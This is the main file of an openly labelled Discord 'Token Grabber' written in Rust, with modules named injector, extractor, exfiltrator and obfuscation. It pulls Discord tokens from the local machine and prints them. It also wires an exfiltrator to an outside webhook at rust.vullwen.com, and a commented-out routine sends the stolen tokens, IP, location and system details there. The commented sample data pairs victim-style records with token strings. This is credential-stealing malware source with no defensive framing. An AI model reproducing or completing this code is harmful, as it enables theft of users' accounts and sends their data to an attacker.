mod injector;
mod extractor;
mod exfiltrator;
mod obfuscation;
mod utils;

use injector::Injector;
use extractor::Extractor;
use exfiltrator::Exfiltrator;
use serde_json;

// const TEST_DATA: &str = r#"
// [
//   {
//     "ip": "90.84.75.123",
//     "location": "Lyon, France",
//     "tokens": [
//       "mfa.A1b2C3d4E5f6G7h8I9j0k.LMnOpQrStUvWxYz123456",
//       "NzI1MzYwNDg4NzEyMzQ1Njc4.Xyz789.ABCdefGHIjklMNopQRst"
//     ],
//     "system_info": {
//       "os": "Windows 10 Pro 64-bit",
//       "cpu": "Intel Core i5-10400F @ 2.90GHz",
//       "ram": 16
//     },
//     "timestamp": 1744815001
//   },
//   {
//     "ip": "51.178.32.45",
//     "location": "Marseille, France",
//     "tokens": [
//       "mfa.Z9Y8X7W6V5U4T3S2R1Q0.ZxYwVuTsRqPoNmLkJiHg",
//       "OTIxMjM0NTY3ODkwMTIz.NbVcXz.MjKlHgFdSaQwErTyUiOp"
//     ],
//     "system_info": {
//       "os": "macOS Ventura 13.4",
//       "cpu": "Apple M1",
//       "ram": 8
//     },
//     "timestamp": 1744814900
//   },
//   {
//     "ip": "192.168.0.42",
//     "location": "Local Network",
//     "tokens": [
//       "token_fake_local_1",
//       "token_fake_local_2"
//     ],
//     "system_info": {
//       "os": "Ubuntu 22.04 LTS",
//       "cpu": "AMD Ryzen 5 5600X",
//       "ram": 32
//     },
//     "timestamp": 1744814800
//   }
// ]
// "#;

#[tokio::main]
async fn main() {
    println!("Token Grabber en Rust");

    let (_injector, extractor, _exfiltrator) = initialize_components();

    let tokens = extractor.extract_discord_tokens();

    if tokens.is_empty() {
        println!("Aucun token Discord trouvé.");
    } else {
        println!("Tokens Discord extraits :");
        for token in &tokens {
            println!("  {}", token);
        }
    }
}

fn initialize_components() -> (Injector, Extractor, Exfiltrator) {
    let webhook_url = "https://rust.vullwen.com/webhook.php";
    let injector = Injector::new();
    let extractor = Extractor::new();
    let exfiltrator = Exfiltrator::new(webhook_url);
    (injector, extractor, exfiltrator)
}

// async fn run_token_grabber(exfiltrator: &Exfiltrator) -> Result<(), String> {
//     let entries: Vec<crate::extractor::ExtractedData> =
//         serde_json::from_str(TEST_DATA).map_err(|e| e.to_string())?;

//     for entry in entries.iter() {
//         println!(
//             "Traitement de l’entrée au timestamp {} (IP : {}, Location : {})",
//             entry.timestamp, entry.ip, entry.location
//         );
//         if entry.tokens.is_empty() {
//             println!("  Aucun token extrait.");
//         } else {
//             println!("  Tokens extraits :");
//             for token in &entry.tokens {
//                 println!("    {}", token);
//             }
//         }
//         exfiltrator.send_data(entry).await?;
//     }
//     Ok(())
// }
